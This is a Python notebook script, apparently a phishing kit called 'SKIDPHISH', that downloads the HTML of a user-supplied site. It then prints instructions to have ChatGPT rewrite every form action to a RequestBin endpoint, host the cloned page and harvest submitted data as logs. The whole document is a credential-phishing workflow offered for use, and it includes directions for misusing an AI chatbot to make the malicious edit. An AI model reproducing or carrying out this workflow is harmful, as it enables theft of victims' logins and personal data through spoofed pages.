# Install required libraries
!pip install requests ipywidgets

import requests
import ipywidgets as widgets
from IPython.display import display, clear_output

# Function to generate a RequestBin link (mock implementation)
def generate_requestbin_link():
    return "https://public.requestbin.com/r/your_unique_requestbin_link"

# Function to fetch HTML from a URL
def fetch_html_from_url(url):
    try:
        response = requests.get(url)
        response.raise_for_status()  # Check if the request was successful
        return response.text
    except requests.RequestException as e:
        return f"Failed to retrieve data from {url}: {e}"

# Function to handle button click
def on_button_click(b):
    with out:
        clear_output()
        url = url_textbox.value.strip()
        html_content = fetch_html_from_url(url)
        requestbin_link = generate_requestbin_link()
        
        # Display HTML content
        print("HTML Content from URL:")
        print(html_content[:5000])  # Print first 5000 characters to avoid overwhelming the output

        # Display a header indicating where the HTML is shown
        print("\n" + "="*80)
        print("HTML content is displayed above.")
        print("="*80)
        
        # Display instructions and RequestBin link
        print("\nInstructions:")
        print("1: Sign in and create a RequestBin link: " + requestbin_link)
        print("2: Paste HTML into ChatGPT.")
        print("3: Tell ChatGPT to change all form action URLs to the new RequestBin link.")
        print("4: Host the new HTML that ChatGPT provides.")
        print("5: Open the RequestBin link to start grabbing logs.")
        
        # Display ASCII Art Header
        print("\n" + "="*80)
        print("███████ ██   ██ ██ ██████  ██████  ██   ██ ██ ███████ ██   ██     ")
        print("██      ██  ██  ██ ██   ██ ██   ██ ██   ██ ██ ██      ██   ██     ")
        print("███████ █████   ██ ██   ██ ██████  ███████ ██ ███████ ███████     ")
        print("     ██ ██  ██  ██ ██   ██ ██      ██   ██ ██      ██ ██   ██     ")
        print("███████ ██   ██ ██ ██████  ██      ██   ██ ██ ███████ ██   ██     ")
        print("="*80)
        
        # Display social media links
        print("\nInstagram: @i0aac")
        print("GitHub: @Soyzo")

# Create widgets
url_textbox = widgets.Text(
    description='Enter URL:',
    placeholder='https://example.com'
)
submit_button = widgets.Button(description='Fetch HTML')
out = widgets.Output()

# Attach the button click event
submit_button.on_click(on_button_click)

# Display widgets
display(url_textbox, submit_button, out)
